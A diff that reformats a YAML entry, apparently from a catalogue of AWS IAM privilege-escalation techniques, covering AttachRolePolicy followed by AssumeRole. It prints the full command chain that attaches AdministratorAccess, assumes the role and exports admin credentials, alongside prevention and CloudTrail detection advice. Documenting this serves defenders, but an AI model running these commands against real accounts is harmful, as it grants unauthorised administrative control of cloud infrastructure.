@@ -46,7 +46,11 @@ exploitationSteps:
       '
     description: Retrieve the AWS account ID and set the target role ARN
   - step: 2
-    command: "# Attach AdministratorAccess policy to the target role\naws iam attach-role-policy \\\n  --role-name $TARGET_ROLE \\\n  --policy-arn \"arn:aws:iam::aws:policy/AdministratorAccess\"\n"
+    command: |
+      # Attach AdministratorAccess policy to the target role
+      aws iam attach-role-policy \
+        --role-name $TARGET_ROLE \
+        --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
     description: Attach the AWS-managed AdministratorAccess policy to the target role
   - step: 3
     command: '# Wait for IAM policy changes to propagate (15 seconds)
@@ -56,10 +60,26 @@ exploitationSteps:
       '
     description: Wait for the policy attachment to propagate across AWS infrastructure
   - step: 4
-    command: "# Verify the policy was attached\naws iam list-attached-role-policies \\\n  --role-name $TARGET_ROLE \\\n  --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \\\n  --output table\n"
+    command: |
+      # Verify the policy was attached
+      aws iam list-attached-role-policies \
+        --role-name $TARGET_ROLE \
+        --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
+        --output table
     description: Verify that AdministratorAccess is now attached to the target role
   - step: 5
-    command: "# Assume the target role with admin permissions\nCREDENTIALS=$(aws sts assume-role \\\n  --role-arn $TARGET_ROLE_ARN \\\n  --role-session-name privesc-session \\\n  --query 'Credentials' \\\n  --output json)\n\n# Export the temporary credentials\nexport AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')\nexport AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')\nexport AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')\n"
+    command: |
+      # Assume the target role with admin permissions
+      CREDENTIALS=$(aws sts assume-role \
+        --role-arn $TARGET_ROLE_ARN \
+        --role-session-name privesc-session \
+        --query 'Credentials' \
+        --output json)
+
+      # Export the temporary credentials
+      export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
+      export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
+      export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
     description: Assume the target role to obtain temporary credentials with administrative permissions
   - step: 6
     command: '# Verify administrative access
@@ -71,7 +91,44 @@ exploitationSteps:
 limitations: 'The attack provides administrative access only if an admin policy (like AdministratorAccess) is attached to the role. However, the attacker could attach any AWS-managed or customer-managed policy they have visibility into, so the level of access depends on available policies.
 
   '
-recommendation: "Restrict `iam:AttachRolePolicy` and `sts:AssumeRole` using the principle of least privilege. These permissions should rarely be granted together on the same target role.\n\n**Prevention strategies:**\n\n1. Use IAM policy conditions to restrict which policies can be attached:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:AttachRolePolicy\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:role/SpecificRole\",\n  \"Condition\": {\n    \"ArnNotEquals\": {\n      \"iam:PolicyARN\": [\n        \"arn:aws:iam::aws:policy/AdministratorAccess\",\n        \"arn:aws:iam::aws:policy/PowerUserAccess\"\n      ]\n    }\n  }\n}\n```\n\n2. Implement Service Control Policies (SCPs) to prevent attachment of highly privileged managed policies\n\n3. Use IAM permissions boundaries to limit the maximum permissions a role can have, even if admin policies are attached\n\n4. Separate the permissions - avoid granting both `iam:AttachRolePolicy` and `sts:AssumeRole` to the same principal for the same role\n\n5. Require MFA for both policy attachment operations and role assumption\n\n**Detection strategies:**\n\nMonitor CloudTrail for the following event patterns:\n- `AttachRolePolicy` API calls, especially when followed by `AssumeRole` on the same resource within a short time window\n- Attachment of AWS-managed policies like `AdministratorAccess` or `PowerUserAccess` to roles\n- Role assumption events (`AssumeRole`) that follow policy modification events\n\nSet up CloudWatch alarms for unexpected changes to role policies and investigate any modifications to role permissions.\n"
+recommendation: |
+  Restrict `iam:AttachRolePolicy` and `sts:AssumeRole` using the principle of least privilege. These permissions should rarely be granted together on the same target role.
+
+  **Prevention strategies:**
+
+  1. Use IAM policy conditions to restrict which policies can be attached:
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:AttachRolePolicy",
+    "Resource": "arn:aws:iam::ACCOUNT:role/SpecificRole",
+    "Condition": {
+      "ArnNotEquals": {
+        "iam:PolicyARN": [
+          "arn:aws:iam::aws:policy/AdministratorAccess",
+          "arn:aws:iam::aws:policy/PowerUserAccess"
+        ]
+      }
+    }
+  }
+  ```
+
+  2. Implement Service Control Policies (SCPs) to prevent attachment of highly privileged managed policies
+
+  3. Use IAM permissions boundaries to limit the maximum permissions a role can have, even if admin policies are attached
+
+  4. Separate the permissions - avoid granting both `iam:AttachRolePolicy` and `sts:AssumeRole` to the same principal for the same role
+
+  5. Require MFA for both policy attachment operations and role assumption
+
+  **Detection strategies:**
+
+  Monitor CloudTrail for the following event patterns:
+  - `AttachRolePolicy` API calls, especially when followed by `AssumeRole` on the same resource within a short time window
+  - Attachment of AWS-managed policies like `AdministratorAccess` or `PowerUserAccess` to roles
+  - Role assumption events (`AssumeRole`) that follow policy modification events
+
+  Set up CloudWatch alarms for unexpected changes to role policies and investigate any modifications to role permissions.
 discoveryAttribution:
   firstDocumented:
     author: Spencer Gietzen
@@ -160,8 +217,34 @@ attackVisualization:
   - from: start
     to: target_role
     label: iam:AttachRolePolicy (AdministratorAccess)
-    description: "The attacker uses `iam:AttachRolePolicy` to attach the AWS-managed AdministratorAccess policy to the target role.\n\nCommand:\n```bash\naws iam attach-role-policy \\\n  --role-name target-role-name \\\n  --policy-arn \"arn:aws:iam::aws:policy/AdministratorAccess\"\n```\n\nAfter this action, the target role has administrative permissions. The attacker must wait approximately 15 seconds for the IAM policy changes to propagate across AWS infrastructure.\n"
+    description: |
+      The attacker uses `iam:AttachRolePolicy` to attach the AWS-managed AdministratorAccess policy to the target role.
+
+      Command:
+      ```bash
+      aws iam attach-role-policy \
+        --role-name target-role-name \
+        --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
+      ```
+
+      After this action, the target role has administrative permissions. The attacker must wait approximately 15 seconds for the IAM policy changes to propagate across AWS infrastructure.
   - from: target_role
     to: admin
     label: sts:AssumeRole
-    description: "The attacker uses `sts:AssumeRole` to assume the now-privileged target role and obtain temporary credentials.\n\nCommand:\n```bash\nCREDENTIALS=$(aws sts assume-role \\\n  --role-arn \"arn:aws:iam::ACCOUNT_ID:role/target-role-name\" \\\n  --role-session-name privesc-session \\\n  --query 'Credentials' \\\n  --output json)\n\nexport AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')\nexport AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')\nexport AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')\n```\n\nThese temporary credentials have full administrative permissions and can be used to perform any action in the AWS account.\n"
+    description: |
+      The attacker uses `sts:AssumeRole` to assume the now-privileged target role and obtain temporary credentials.
+
+      Command:
+      ```bash
+      CREDENTIALS=$(aws sts assume-role \
+        --role-arn "arn:aws:iam::ACCOUNT_ID:role/target-role-name" \
+        --role-session-name privesc-session \
+        --query 'Credentials' \
+        --output json)
+
+      export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
+      export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
+      export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
+      ```
+
+      These temporary credentials have full administrative permissions and can be used to perform any action in the AWS account.
